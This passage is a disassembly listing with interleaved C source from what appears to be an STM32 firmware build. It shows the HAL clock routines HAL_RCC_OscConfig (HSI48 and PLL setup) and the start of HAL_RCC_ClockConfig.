      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003ff4:	4b7d      	ldr	r3, [pc, #500]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8003ff6:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003ffa:	f003 0302 	and.w	r3, r3, #2
 8003ffe:	2b00      	cmp	r3, #0
 8004000:	d1ed      	bne.n	8003fde <HAL_RCC_OscConfig+0x56a>
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSESYSDIS);
#endif /* RCC_BDCR_LSESYSDIS */
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8004002:	7ffb      	ldrb	r3, [r7, #31]
 8004004:	2b01      	cmp	r3, #1
 8004006:	d105      	bne.n	8004014 <HAL_RCC_OscConfig+0x5a0>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 8004008:	4b78      	ldr	r3, [pc, #480]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 800400a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800400c:	4a77      	ldr	r2, [pc, #476]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 800400e:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004012:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }
#if defined(RCC_HSI48_SUPPORT)
  /*------------------------------ HSI48 Configuration -----------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)
 8004014:	687b      	ldr	r3, [r7, #4]
 8004016:	681b      	ldr	r3, [r3, #0]
 8004018:	f003 0320 	and.w	r3, r3, #32
 800401c:	2b00      	cmp	r3, #0
 800401e:	d03c      	beq.n	800409a <HAL_RCC_OscConfig+0x626>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));

    /* Check the LSI State */
    if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)
 8004020:	687b      	ldr	r3, [r7, #4]
 8004022:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004024:	2b00      	cmp	r3, #0
 8004026:	d01c      	beq.n	8004062 <HAL_RCC_OscConfig+0x5ee>
    {
      /* Enable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_ENABLE();
 8004028:	4b70      	ldr	r3, [pc, #448]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 800402a:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 800402e:	4a6f      	ldr	r2, [pc, #444]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8004030:	f043 0301 	orr.w	r3, r3, #1
 8004034:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004038:	f7fd f998 	bl	800136c <HAL_GetTick>
 800403c:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is ready */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 800403e:	e008      	b.n	8004052 <HAL_RCC_OscConfig+0x5de>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8004040:	f7fd f994 	bl	800136c <HAL_GetTick>
 8004044:	4602      	mov	r2, r0
 8004046:	693b      	ldr	r3, [r7, #16]
 8004048:	1ad3      	subs	r3, r2, r3
 800404a:	2b02      	cmp	r3, #2
 800404c:	d901      	bls.n	8004052 <HAL_RCC_OscConfig+0x5de>
        {
          return HAL_TIMEOUT;
 800404e:	2303      	movs	r3, #3
 8004050:	e11c      	b.n	800428c <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8004052:	4b66      	ldr	r3, [pc, #408]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8004054:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8004058:	f003 0302 	and.w	r3, r3, #2
 800405c:	2b00      	cmp	r3, #0
 800405e:	d0ef      	beq.n	8004040 <HAL_RCC_OscConfig+0x5cc>
 8004060:	e01b      	b.n	800409a <HAL_RCC_OscConfig+0x626>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_DISABLE();
 8004062:	4b62      	ldr	r3, [pc, #392]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8004064:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8004068:	4a60      	ldr	r2, [pc, #384]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 800406a:	f023 0301 	bic.w	r3, r3, #1
 800406e:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004072:	f7fd f97b 	bl	800136c <HAL_GetTick>
 8004076:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is disabled */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8004078:	e008      	b.n	800408c <HAL_RCC_OscConfig+0x618>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 800407a:	f7fd f977 	bl	800136c <HAL_GetTick>
 800407e:	4602      	mov	r2, r0
 8004080:	693b      	ldr	r3, [r7, #16]
 8004082:	1ad3      	subs	r3, r2, r3
 8004084:	2b02      	cmp	r3, #2
 8004086:	d901      	bls.n	800408c <HAL_RCC_OscConfig+0x618>
        {
          return HAL_TIMEOUT;
 8004088:	2303      	movs	r3, #3
 800408a:	e0ff      	b.n	800428c <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 800408c:	4b57      	ldr	r3, [pc, #348]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 800408e:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8004092:	f003 0302 	and.w	r3, r3, #2
 8004096:	2b00      	cmp	r3, #0
 8004098:	d1ef      	bne.n	800407a <HAL_RCC_OscConfig+0x606>
#endif /* RCC_HSI48_SUPPORT */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));

  if(RCC_OscInitStruct->PLL.PLLState != RCC_PLL_NONE)
 800409a:	687b      	ldr	r3, [r7, #4]
 800409c:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800409e:	2b00      	cmp	r3, #0
 80040a0:	f000 80f3 	beq.w	800428a <HAL_RCC_OscConfig+0x816>
  {
    /* PLL On ? */
    if(RCC_OscInitStruct->PLL.PLLState == RCC_PLL_ON)
 80040a4:	687b      	ldr	r3, [r7, #4]
 80040a6:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 80040a8:	2b02      	cmp	r3, #2
 80040aa:	f040 80c9 	bne.w	8004240 <HAL_RCC_OscConfig+0x7cc>
#endif /* RCC_PLLP_SUPPORT */
      assert_param(IS_RCC_PLLQ_VALUE(RCC_OscInitStruct->PLL.PLLQ));
      assert_param(IS_RCC_PLLR_VALUE(RCC_OscInitStruct->PLL.PLLR));

      /* Do nothing if PLL configuration is the unchanged */
      pll_config = RCC->PLLCFGR;
 80040ae:	4b4f      	ldr	r3, [pc, #316]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 80040b0:	68db      	ldr	r3, [r3, #12]
 80040b2:	617b      	str	r3, [r7, #20]
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 80040b4:	697b      	ldr	r3, [r7, #20]
 80040b6:	f003 0203 	and.w	r2, r3, #3
 80040ba:	687b      	ldr	r3, [r7, #4]
 80040bc:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80040be:	429a      	cmp	r2, r3
 80040c0:	d12c      	bne.n	800411c <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 80040c2:	697b      	ldr	r3, [r7, #20]
 80040c4:	f003 0270 	and.w	r2, r3, #112	; 0x70
 80040c8:	687b      	ldr	r3, [r7, #4]
 80040ca:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 80040cc:	3b01      	subs	r3, #1
 80040ce:	011b      	lsls	r3, r3, #4
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 80040d0:	429a      	cmp	r2, r3
 80040d2:	d123      	bne.n	800411c <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 80040d4:	697b      	ldr	r3, [r7, #20]
 80040d6:	f403 42fe 	and.w	r2, r3, #32512	; 0x7f00
 80040da:	687b      	ldr	r3, [r7, #4]
 80040dc:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 80040de:	021b      	lsls	r3, r3, #8
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 80040e0:	429a      	cmp	r2, r3
 80040e2:	d11b      	bne.n	800411c <HAL_RCC_OscConfig+0x6a8>
#if defined(RCC_PLLP_SUPPORT)
#if defined(RCC_PLLP_DIV_2_31_SUPPORT)
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 80040e4:	697b      	ldr	r3, [r7, #20]
 80040e6:	f003 4278 	and.w	r2, r3, #4160749568	; 0xf8000000
 80040ea:	687b      	ldr	r3, [r7, #4]
 80040ec:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 80040ee:	06db      	lsls	r3, r3, #27
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 80040f0:	429a      	cmp	r2, r3
 80040f2:	d113      	bne.n	800411c <HAL_RCC_OscConfig+0x6a8>
#else
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLP)    != ((RCC_OscInitStruct->PLL.PLLP == RCC_PLLP_DIV7) ? 0U : 1U)) ||
#endif
#endif
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 80040f4:	697b      	ldr	r3, [r7, #20]
 80040f6:	f403 02c0 	and.w	r2, r3, #6291456	; 0x600000
 80040fa:	687b      	ldr	r3, [r7, #4]
 80040fc:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 80040fe:	085b      	lsrs	r3, r3, #1
 8004100:	3b01      	subs	r3, #1
 8004102:	055b      	lsls	r3, r3, #21
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8004104:	429a      	cmp	r2, r3
 8004106:	d109      	bne.n	800411c <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLR)    != ((((RCC_OscInitStruct->PLL.PLLR) >> 1U) - 1U) << RCC_PLLCFGR_PLLR_Pos)))
 8004108:	697b      	ldr	r3, [r7, #20]
 800410a:	f003 62c0 	and.w	r2, r3, #100663296	; 0x6000000
 800410e:	687b      	ldr	r3, [r7, #4]
 8004110:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004112:	085b      	lsrs	r3, r3, #1
 8004114:	3b01      	subs	r3, #1
 8004116:	065b      	lsls	r3, r3, #25
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8004118:	429a      	cmp	r2, r3
 800411a:	d06b      	beq.n	80041f4 <HAL_RCC_OscConfig+0x780>
      {
        /* Check if the PLL is used as system clock or not */
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 800411c:	69bb      	ldr	r3, [r7, #24]
 800411e:	2b0c      	cmp	r3, #12
 8004120:	d062      	beq.n	80041e8 <HAL_RCC_OscConfig+0x774>
        {
#if defined(RCC_PLLSAI1_SUPPORT) || defined(RCC_PLLSAI2_SUPPORT)
          /* Check if main PLL can be updated */
          /* Not possible if the source is shared by other enabled PLLSAIx */
          if((READ_BIT(RCC->CR, RCC_CR_PLLSAI1ON) != 0U)
 8004122:	4b32      	ldr	r3, [pc, #200]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8004124:	681b      	ldr	r3, [r3, #0]
 8004126:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800412a:	2b00      	cmp	r3, #0
 800412c:	d001      	beq.n	8004132 <HAL_RCC_OscConfig+0x6be>
#if defined(RCC_PLLSAI2_SUPPORT)
             || (READ_BIT(RCC->CR, RCC_CR_PLLSAI2ON) != 0U)
#endif
            )
          {
            return HAL_ERROR;
 800412e:	2301      	movs	r3, #1
 8004130:	e0ac      	b.n	800428c <HAL_RCC_OscConfig+0x818>
          }
          else
#endif /* RCC_PLLSAI1_SUPPORT || RCC_PLLSAI2_SUPPORT */
          {
            /* Disable the main PLL. */
            __HAL_RCC_PLL_DISABLE();
 8004132:	4b2e      	ldr	r3, [pc, #184]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8004134:	681b      	ldr	r3, [r3, #0]
 8004136:	4a2d      	ldr	r2, [pc, #180]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8004138:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 800413c:	6013      	str	r3, [r2, #0]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 800413e:	f7fd f915 	bl	800136c <HAL_GetTick>
 8004142:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004144:	e008      	b.n	8004158 <HAL_RCC_OscConfig+0x6e4>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004146:	f7fd f911 	bl	800136c <HAL_GetTick>
 800414a:	4602      	mov	r2, r0
 800414c:	693b      	ldr	r3, [r7, #16]
 800414e:	1ad3      	subs	r3, r2, r3
 8004150:	2b02      	cmp	r3, #2
 8004152:	d901      	bls.n	8004158 <HAL_RCC_OscConfig+0x6e4>
              {
                return HAL_TIMEOUT;
 8004154:	2303      	movs	r3, #3
 8004156:	e099      	b.n	800428c <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004158:	4b24      	ldr	r3, [pc, #144]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 800415a:	681b      	ldr	r3, [r3, #0]
 800415c:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004160:	2b00      	cmp	r3, #0
 8004162:	d1f0      	bne.n	8004146 <HAL_RCC_OscConfig+0x6d2>
              }
            }

            /* Configure the main PLL clock source, multiplication and division factors. */
#if defined(RCC_PLLP_SUPPORT)
            __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 8004164:	4b21      	ldr	r3, [pc, #132]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8004166:	68da      	ldr	r2, [r3, #12]
 8004168:	4b21      	ldr	r3, [pc, #132]	; (80041f0 <HAL_RCC_OscConfig+0x77c>)
 800416a:	4013      	ands	r3, r2
 800416c:	687a      	ldr	r2, [r7, #4]
 800416e:	6ad1      	ldr	r1, [r2, #44]	; 0x2c
 8004170:	687a      	ldr	r2, [r7, #4]
 8004172:	6b12      	ldr	r2, [r2, #48]	; 0x30
 8004174:	3a01      	subs	r2, #1
 8004176:	0112      	lsls	r2, r2, #4
 8004178:	4311      	orrs	r1, r2
 800417a:	687a      	ldr	r2, [r7, #4]
 800417c:	6b52      	ldr	r2, [r2, #52]	; 0x34
 800417e:	0212      	lsls	r2, r2, #8
 8004180:	4311      	orrs	r1, r2
 8004182:	687a      	ldr	r2, [r7, #4]
 8004184:	6bd2      	ldr	r2, [r2, #60]	; 0x3c
 8004186:	0852      	lsrs	r2, r2, #1
 8004188:	3a01      	subs	r2, #1
 800418a:	0552      	lsls	r2, r2, #21
 800418c:	4311      	orrs	r1, r2
 800418e:	687a      	ldr	r2, [r7, #4]
 8004190:	6c12      	ldr	r2, [r2, #64]	; 0x40
 8004192:	0852      	lsrs	r2, r2, #1
 8004194:	3a01      	subs	r2, #1
 8004196:	0652      	lsls	r2, r2, #25
 8004198:	4311      	orrs	r1, r2
 800419a:	687a      	ldr	r2, [r7, #4]
 800419c:	6b92      	ldr	r2, [r2, #56]	; 0x38
 800419e:	06d2      	lsls	r2, r2, #27
 80041a0:	430a      	orrs	r2, r1
 80041a2:	4912      	ldr	r1, [pc, #72]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 80041a4:	4313      	orrs	r3, r2
 80041a6:	60cb      	str	r3, [r1, #12]
                                 RCC_OscInitStruct->PLL.PLLQ,
                                 RCC_OscInitStruct->PLL.PLLR);
#endif

            /* Enable the main PLL. */
            __HAL_RCC_PLL_ENABLE();
 80041a8:	4b10      	ldr	r3, [pc, #64]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 80041aa:	681b      	ldr	r3, [r3, #0]
 80041ac:	4a0f      	ldr	r2, [pc, #60]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 80041ae:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 80041b2:	6013      	str	r3, [r2, #0]

            /* Enable PLL System Clock output. */
            __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 80041b4:	4b0d      	ldr	r3, [pc, #52]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 80041b6:	68db      	ldr	r3, [r3, #12]
 80041b8:	4a0c      	ldr	r2, [pc, #48]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 80041ba:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 80041be:	60d3      	str	r3, [r2, #12]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 80041c0:	f7fd f8d4 	bl	800136c <HAL_GetTick>
 80041c4:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80041c6:	e008      	b.n	80041da <HAL_RCC_OscConfig+0x766>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 80041c8:	f7fd f8d0 	bl	800136c <HAL_GetTick>
 80041cc:	4602      	mov	r2, r0
 80041ce:	693b      	ldr	r3, [r7, #16]
 80041d0:	1ad3      	subs	r3, r2, r3
 80041d2:	2b02      	cmp	r3, #2
 80041d4:	d901      	bls.n	80041da <HAL_RCC_OscConfig+0x766>
              {
                return HAL_TIMEOUT;
 80041d6:	2303      	movs	r3, #3
 80041d8:	e058      	b.n	800428c <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80041da:	4b04      	ldr	r3, [pc, #16]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 80041dc:	681b      	ldr	r3, [r3, #0]
 80041de:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80041e2:	2b00      	cmp	r3, #0
 80041e4:	d0f0      	beq.n	80041c8 <HAL_RCC_OscConfig+0x754>
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 80041e6:	e050      	b.n	800428a <HAL_RCC_OscConfig+0x816>
          }
        }
        else
        {
          /* PLL is already used as System core clock */
          return HAL_ERROR;
 80041e8:	2301      	movs	r3, #1
 80041ea:	e04f      	b.n	800428c <HAL_RCC_OscConfig+0x818>
 80041ec:	40021000 	.word	0x40021000
 80041f0:	019d808c 	.word	0x019d808c
      }
      else
      {
        /* PLL configuration is unchanged */
        /* Re-enable PLL if it was disabled (ie. low power mode) */
        if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80041f4:	4b27      	ldr	r3, [pc, #156]	; (8004294 <HAL_RCC_OscConfig+0x820>)
 80041f6:	681b      	ldr	r3, [r3, #0]
 80041f8:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80041fc:	2b00      	cmp	r3, #0
 80041fe:	d144      	bne.n	800428a <HAL_RCC_OscConfig+0x816>
        {
          /* Enable the main PLL. */
          __HAL_RCC_PLL_ENABLE();
 8004200:	4b24      	ldr	r3, [pc, #144]	; (8004294 <HAL_RCC_OscConfig+0x820>)
 8004202:	681b      	ldr	r3, [r3, #0]
 8004204:	4a23      	ldr	r2, [pc, #140]	; (8004294 <HAL_RCC_OscConfig+0x820>)
 8004206:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800420a:	6013      	str	r3, [r2, #0]

          /* Enable PLL System Clock output. */
          __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 800420c:	4b21      	ldr	r3, [pc, #132]	; (8004294 <HAL_RCC_OscConfig+0x820>)
 800420e:	68db      	ldr	r3, [r3, #12]
 8004210:	4a20      	ldr	r2, [pc, #128]	; (8004294 <HAL_RCC_OscConfig+0x820>)
 8004212:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8004216:	60d3      	str	r3, [r2, #12]

          /* Get Start Tick*/
          tickstart = HAL_GetTick();
 8004218:	f7fd f8a8 	bl	800136c <HAL_GetTick>
 800421c:	6138      	str	r0, [r7, #16]

          /* Wait till PLL is ready */
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800421e:	e008      	b.n	8004232 <HAL_RCC_OscConfig+0x7be>
          {
            if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004220:	f7fd f8a4 	bl	800136c <HAL_GetTick>
 8004224:	4602      	mov	r2, r0
 8004226:	693b      	ldr	r3, [r7, #16]
 8004228:	1ad3      	subs	r3, r2, r3
 800422a:	2b02      	cmp	r3, #2
 800422c:	d901      	bls.n	8004232 <HAL_RCC_OscConfig+0x7be>
            {
              return HAL_TIMEOUT;
 800422e:	2303      	movs	r3, #3
 8004230:	e02c      	b.n	800428c <HAL_RCC_OscConfig+0x818>
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004232:	4b18      	ldr	r3, [pc, #96]	; (8004294 <HAL_RCC_OscConfig+0x820>)
 8004234:	681b      	ldr	r3, [r3, #0]
 8004236:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800423a:	2b00      	cmp	r3, #0
 800423c:	d0f0      	beq.n	8004220 <HAL_RCC_OscConfig+0x7ac>
 800423e:	e024      	b.n	800428a <HAL_RCC_OscConfig+0x816>
      }
    }
    else
    {
      /* Check that PLL is not used as system clock or not */
      if(sysclk_source != RCC_CFGR_SWS_PLL)
 8004240:	69bb      	ldr	r3, [r7, #24]
 8004242:	2b0c      	cmp	r3, #12
 8004244:	d01f      	beq.n	8004286 <HAL_RCC_OscConfig+0x812>
      {
        /* Disable the main PLL. */
        __HAL_RCC_PLL_DISABLE();
 8004246:	4b13      	ldr	r3, [pc, #76]	; (8004294 <HAL_RCC_OscConfig+0x820>)
 8004248:	681b      	ldr	r3, [r3, #0]
 800424a:	4a12      	ldr	r2, [pc, #72]	; (8004294 <HAL_RCC_OscConfig+0x820>)
 800424c:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8004250:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8004252:	f7fd f88b 	bl	800136c <HAL_GetTick>
 8004256:	6138      	str	r0, [r7, #16]

        /* Wait till PLL is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004258:	e008      	b.n	800426c <HAL_RCC_OscConfig+0x7f8>
        {
          if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 800425a:	f7fd f887 	bl	800136c <HAL_GetTick>
 800425e:	4602      	mov	r2, r0
 8004260:	693b      	ldr	r3, [r7, #16]
 8004262:	1ad3      	subs	r3, r2, r3
 8004264:	2b02      	cmp	r3, #2
 8004266:	d901      	bls.n	800426c <HAL_RCC_OscConfig+0x7f8>
          {
            return HAL_TIMEOUT;
 8004268:	2303      	movs	r3, #3
 800426a:	e00f      	b.n	800428c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 800426c:	4b09      	ldr	r3, [pc, #36]	; (8004294 <HAL_RCC_OscConfig+0x820>)
 800426e:	681b      	ldr	r3, [r3, #0]
 8004270:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004274:	2b00      	cmp	r3, #0
 8004276:	d1f0      	bne.n	800425a <HAL_RCC_OscConfig+0x7e6>
        }
        /* Unselect main PLL clock source and disable main PLL outputs to save power */
#if defined(RCC_PLLSAI2_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI3CLK);
#elif defined(RCC_PLLSAI1_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI2CLK);
 8004278:	4b06      	ldr	r3, [pc, #24]	; (8004294 <HAL_RCC_OscConfig+0x820>)
 800427a:	68da      	ldr	r2, [r3, #12]
 800427c:	4905      	ldr	r1, [pc, #20]	; (8004294 <HAL_RCC_OscConfig+0x820>)
 800427e:	4b06      	ldr	r3, [pc, #24]	; (8004298 <HAL_RCC_OscConfig+0x824>)
 8004280:	4013      	ands	r3, r2
 8004282:	60cb      	str	r3, [r1, #12]
 8004284:	e001      	b.n	800428a <HAL_RCC_OscConfig+0x816>
#endif /* RCC_PLLSAI2_SUPPORT */
      }
      else
      {
        /* PLL is already used as System core clock */
        return HAL_ERROR;
 8004286:	2301      	movs	r3, #1
 8004288:	e000      	b.n	800428c <HAL_RCC_OscConfig+0x818>
      }
    }
  }
  return HAL_OK;
 800428a:	2300      	movs	r3, #0
}
 800428c:	4618      	mov	r0, r3
 800428e:	3720      	adds	r7, #32
 8004290:	46bd      	mov	sp, r7
 8004292:	bd80      	pop	{r7, pc}
 8004294:	40021000 	.word	0x40021000
 8004298:	feeefffc 	.word	0xfeeefffc

0800429c <HAL_RCC_ClockConfig>:
  *         HPRE[3:0] bits to ensure that HCLK not exceed the maximum allowed frequency
  *         (for more details refer to section above "Initialization/de-initialization functions")
  * @retval None
  */
HAL_StatusTypeDef HAL_RCC_ClockConfig(RCC_ClkInitTypeDef  *RCC_ClkInitStruct, uint32_t FLatency)
{
 800429c:	b580      	push	{r7, lr}
 800429e:	b084      	sub	sp, #16
 80042a0:	af00      	add	r7, sp, #0
 80042a2:	6078      	str	r0, [r7, #4]
 80042a4:	6039      	str	r1, [r7, #0]
  uint32_t hpre = RCC_SYSCLK_DIV1;
#endif
  HAL_StatusTypeDef status;

  /* Check Null pointer */
  if(RCC_ClkInitStruct == NULL)
 80042a6:	687b      	ldr	r3, [r7, #4]
 80042a8:	2b00      	cmp	r3, #0
 80042aa:	d101      	bne.n	80042b0 <HAL_RCC_ClockConfig+0x14>
  {
    return HAL_ERROR;
 80042ac:	2301      	movs	r3, #1
 80042ae:	e0e7      	b.n	8004480 <HAL_RCC_ClockConfig+0x1e4>
  /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
    must be correctly programmed according to the frequency of the CPU clock
    (HCLK) and the supply voltage of the device. */

  /* Increasing the number of wait states because of higher CPU frequency */
  if(FLatency > __HAL_FLASH_GET_LATENCY())
 80042b0:	4b75      	ldr	r3, [pc, #468]	; (8004488 <HAL_RCC_ClockConfig+0x1ec>)
 80042b2:	681b      	ldr	r3, [r3, #0]
 80042b4:	f003 0307 	and.w	r3, r3, #7
 80042b8:	683a      	ldr	r2, [r7, #0]
 80042ba:	429a      	cmp	r2, r3
 80042bc:	d910      	bls.n	80042e0 <HAL_RCC_ClockConfig+0x44>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 80042be:	4b72      	ldr	r3, [pc, #456]	; (8004488 <HAL_RCC_ClockConfig+0x1ec>)
 80042c0:	681b      	ldr	r3, [r3, #0]
 80042c2:	f023 0207 	bic.w	r2, r3, #7
 80042c6:	4970      	ldr	r1, [pc, #448]	; (8004488 <HAL_RCC_ClockConfig+0x1ec>)
 80042c8:	683b      	ldr	r3, [r7, #0]
 80042ca:	4313      	orrs	r3, r2
 80042cc:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 80042ce:	4b6e      	ldr	r3, [pc, #440]	; (8004488 <HAL_RCC_ClockConfig+0x1ec>)
 80042d0:	681b      	ldr	r3, [r3, #0]
 80042d2:	f003 0307 	and.w	r3, r3, #7
 80042d6:	683a      	ldr	r2, [r7, #0]
 80042d8:	429a      	cmp	r2, r3
 80042da:	d001      	beq.n	80042e0 <HAL_RCC_ClockConfig+0x44>
    {
      return HAL_ERROR;
 80042dc:	2301      	movs	r3, #1
 80042de:	e0cf      	b.n	8004480 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*----------------- HCLK Configuration prior to SYSCLK----------------------*/
  /* Apply higher HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is increased */
